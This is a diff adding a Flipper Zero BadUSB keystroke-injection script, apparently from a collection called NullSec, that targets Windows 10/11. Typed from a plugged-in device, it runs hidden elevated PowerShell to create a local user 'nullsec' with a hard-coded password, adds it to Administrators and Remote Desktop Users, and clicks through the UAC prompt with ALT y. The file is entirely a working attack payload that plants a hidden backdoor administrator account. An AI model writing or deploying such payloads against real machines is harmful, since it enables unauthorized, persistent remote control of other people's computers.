@@ -1,0 +1,13 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Create Admin User
+REM Target: Windows 10/11 (Requires Admin)
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden Start-Process powershell -Verb runAs -ArgumentList '-w hidden -c "net user nullsec N0tS3cur3! /add; net localgroup Administrators nullsec /add; net localgroup \"Remote Desktop Users\" nullsec /add"'
+ENTER
+DELAY 2000
+ALT y
+ENTER
